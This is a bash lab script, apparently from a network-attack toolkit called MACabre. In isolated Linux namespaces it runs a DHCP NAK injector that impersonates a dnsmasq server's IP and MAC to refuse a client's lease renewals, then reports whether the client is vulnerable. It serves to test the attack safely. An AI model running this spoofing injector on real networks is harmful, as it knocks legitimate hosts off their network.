#!/usr/bin/env bash
# Isolated DHCP NAK injection lab (Linux only, needs root).
#
# Topology: one bridge (the LAN) with three hosts attached:
#
#   server:   dnsmasq, the legitimate DHCP server (10.99.0.1, pool 10.99.0.100-119).
#             Its MAC and address are copied by the attacker.
#   attacker: MACabre's DHCP NAK injector. It answers the client's renewal requests
#             with a NAK in the name of the server (10.99.0.1 and the server's MAC),
#             and only for the client's MAC.
#   client:   a DHCP client. It takes a lease once from the legitimate server, then
#             runs five renewals: a DHCPREQUEST with its leased address, sent unicast
#             to the server. It records whether the server acknowledged each renewal
#             or refused it.
#
#   Phase 1 (baseline): only the legitimate server runs. Every renewal is acknowledged.
#   Phase 2 (race): the legitimate server and the injector both run.
#   Phase 3 (alone): the legitimate server is stopped. The injector answers the renewals.
#
# A client that receives a NAK must drop its lease and start again, so a NAK is what
# the lab counts as a successful injection.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/dhcp_nak_injection_lab.sh
#   sudo ROUNDS=10 scripts/lab/dhcp_nak_injection_lab.sh
#
# Requirements: iproute2, dnsmasq, and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip dnsmasq; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
ROUNDS="${ROUNDS:-5}"
ATTACK_SECONDS=30
CLIENT_MAC="02:00:00:00:00:50"
LEGIT_IP="10.99.0.1"
WORK="$(mktemp -d)"
LOG="$WORK/dnsmasq.log"

stop_lab() {
    for pid in $(ip netns pids server 2>/dev/null || true); do
        kill "$pid" 2>/dev/null || true
    done
    for ns in client attacker server lan; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
cleanup() {
    stop_lab
    rm -rf "$WORK"
}
trap cleanup EXIT

stop_lab

ip netns add lan
ip netns add server
ip netns add attacker
ip netns add client

# Each host has a veth to a port of the LAN bridge.
for pair in "srv:server" "att:attacker" "cli:client"; do
    name="${pair%%:*}"
    ns="${pair##*:}"
    ip link add "p-$name" type veth peer name "h-$name"
    ip link set "h-$name" netns "$ns"
    ip link set "p-$name" netns lan
done

ip netns exec lan ip link add br0 type bridge
ip netns exec lan ip link set br0 up
for name in srv att cli; do
    ip netns exec lan ip link set "p-$name" master br0
    ip netns exec lan ip link set "p-$name" up
done

ip netns exec server ip link set lo up
ip netns exec server ip addr add "$LEGIT_IP/24" dev h-srv
ip netns exec server ip link set h-srv up
ip netns exec attacker ip link set h-att up
ip netns exec client ip link set h-cli address "$CLIENT_MAC"
ip netns exec client ip link set h-cli up

LEGIT_MAC="$(ip netns exec server ip -o link show h-srv | grep -o 'link/ether [0-9a-f:]*' | awk '{print $2}')"

start_server() {
    ip netns exec server dnsmasq \
        --keep-in-foreground \
        --interface=h-srv \
        --bind-interfaces \
        --port=0 \
        --conf-file=/dev/null \
        --dhcp-authoritative \
        --no-ping \
        --dhcp-range=10.99.0.100,10.99.0.119,12h \
        --dhcp-leasefile="$WORK/leases" \
        --log-dhcp \
        --log-facility="$LOG" &
    sleep 2
}
start_server

NAK_CODE='
import os, threading
from macabre.attacks.dhcp_nak_injection import NakInjectionConfig, run_nak_injection
stop = threading.Event()
threading.Timer(float(os.environ["ATTACK_SECONDS"]), stop.set).start()
stats = run_nak_injection(
    NakInjectionConfig(
        iface="h-att",
        server_ip="10.99.0.1",
        server_mac=os.environ["LEGIT_MAC"],
        target_mac=os.environ["CLIENT_MAC"],
    ),
    stop,
    lambda _: None,
)
print(f"Injector: saw {stats.requests} requests and sent {stats.naks} NAKs as 10.99.0.1")
'

# The client takes a lease once (MODE=lease), then renews it (MODE=renew).
CLIENT_CODE='
import os, random, time
from scapy.all import AsyncSniffer, sendp, BOOTP, DHCP, Ether, IP, UDP
from macabre.attacks.dhcp_starvation import build_discover, build_request

MAC = os.environ["CLIENT_MAC"]
MODE = os.environ["MODE"]
rng = random.Random()
seen = []

def on_packet(pkt):
    if pkt.haslayer(DHCP) and pkt.haslayer(BOOTP) and pkt[BOOTP].op == 2:
        seen.append(pkt)

def options(pkt):
    return {o[0]: o[1] for o in pkt[DHCP].options if isinstance(o, tuple)}

def mtype(pkt):
    return options(pkt).get("message-type")

sniffer = AsyncSniffer(iface="h-cli", store=False, prn=on_packet)
sniffer.start()
time.sleep(0.5)

if MODE == "lease":
    xid = rng.getrandbits(32)
    sendp(build_discover(MAC, xid), iface="h-cli", verbose=False)
    time.sleep(1.5)
    offers = [p for p in seen if p[BOOTP].xid == xid and mtype(p) == 2]
    if not offers:
        raise SystemExit("no offer")
    first = offers[0]
    sendp(build_request(MAC, xid, first[BOOTP].yiaddr, options(first).get("server_id")), iface="h-cli", verbose=False)
    time.sleep(1.5)
    if not [p for p in seen if p[BOOTP].xid == xid and mtype(p) == 5]:
        raise SystemExit("no ack for the lease")
    print(first[BOOTP].yiaddr)
else:
    leased = os.environ["LEASED_IP"]
    ROUNDS = int(os.environ["ROUNDS"])
    acked = refused = 0
    for n in range(1, ROUNDS + 1):
        xid = rng.getrandbits(32)
        seen.clear()
        renew = (
            Ether(src=MAC, dst="ff:ff:ff:ff:ff:ff")
            / IP(src=leased, dst="10.99.0.1")
            / UDP(sport=68, dport=67)
            / BOOTP(chaddr=bytes.fromhex(MAC.replace(":", "")).ljust(16, b"\x00"), xid=xid, ciaddr=leased)
            / DHCP(options=[("message-type", "request"), "end"])
        )
        sendp(renew, iface="h-cli", verbose=False)
        time.sleep(1.5)
        replies = [p for p in seen if p[BOOTP].xid == xid and mtype(p) in (5, 6)]
        if not replies:
            print(f"round {n}: no reply to the renewal")
            continue
        reply = replies[0]
        server = options(reply).get("server_id")
        if mtype(reply) == 6:
            refused += 1
            kind = "NAK"
        else:
            acked += 1
            kind = "ACK"
        print(f"round {n}: renewal answered with {kind} from {server}")
    print(f"Client: renewal refused with a NAK in {refused} of {ROUNDS} rounds; acknowledged in {acked} of {ROUNDS}")
sniffer.stop()
'

run_client() {
    ip netns exec client env PYTHONPATH="$ROOT/src" CLIENT_MAC="$CLIENT_MAC" ROUNDS="$ROUNDS" \
        MODE="$1" LEASED_IP="${LEASED_IP:-}" "$PY" -c "$CLIENT_CODE"
}

LEASED_IP="$(run_client lease)"
# The client configures the leased address on its interface, as a real host would.
ip netns exec client ip addr add "$LEASED_IP/24" dev h-cli
echo "Lease: the client holds $LEASED_IP from the legitimate server."
echo

echo "Phase 1: baseline, legitimate server only ($ROUNDS renewals)"
run_client renew | tee "$WORK/baseline.txt"
echo

echo "Phase 2: injector and legitimate server both running for ${ATTACK_SECONDS}s ($ROUNDS renewals)"
ip netns exec attacker env PYTHONPATH="$ROOT/src" ATTACK_SECONDS="$ATTACK_SECONDS" LEGIT_MAC="$LEGIT_MAC" \
    CLIENT_MAC="$CLIENT_MAC" "$PY" -c "$NAK_CODE" &
INJECT_PID=$!
sleep 2
run_client renew | tee "$WORK/race.txt"
wait "$INJECT_PID"
echo

echo "Phase 3: legitimate server stopped, injector running for ${ATTACK_SECONDS}s ($ROUNDS renewals)"
for pid in $(ip netns pids server 2>/dev/null || true); do
    kill "$pid" 2>/dev/null || true
done
sleep 2
ip netns exec attacker env PYTHONPATH="$ROOT/src" ATTACK_SECONDS="$ATTACK_SECONDS" LEGIT_MAC="$LEGIT_MAC" \
    CLIENT_MAC="$CLIENT_MAC" "$PY" -c "$NAK_CODE" &
INJECT_PID=$!
sleep 2
run_client renew | tee "$WORK/alone.txt"
wait "$INJECT_PID"
echo

BASE_NAK="$(grep -c 'answered with NAK' "$WORK/baseline.txt" || true)"
RACE_NAK="$(grep -c 'answered with NAK' "$WORK/race.txt" || true)"
ALONE_NAK="$(grep -c 'answered with NAK' "$WORK/alone.txt" || true)"

if (( BASE_NAK == 0 )); then
    echo "Baseline: every renewal was acknowledged. OK"
else
    echo "Baseline: $BASE_NAK renewals were refused before the attack. Result unreliable."
fi
if (( RACE_NAK == 0 )); then
    echo "Race: with both servers running, no renewal was refused. In this lab the legitimate server answers first."
else
    echo "Race: with both servers running, $RACE_NAK of $ROUNDS renewals were refused with a NAK from 10.99.0.1."
fi
if (( ALONE_NAK > 0 )); then
    echo "Alone: with the legitimate server stopped, $ALONE_NAK of $ROUNDS renewals were refused with a NAK from 10.99.0.1. Vulnerable."
else
    echo "Alone: no renewal was refused. Result unreliable."
fi
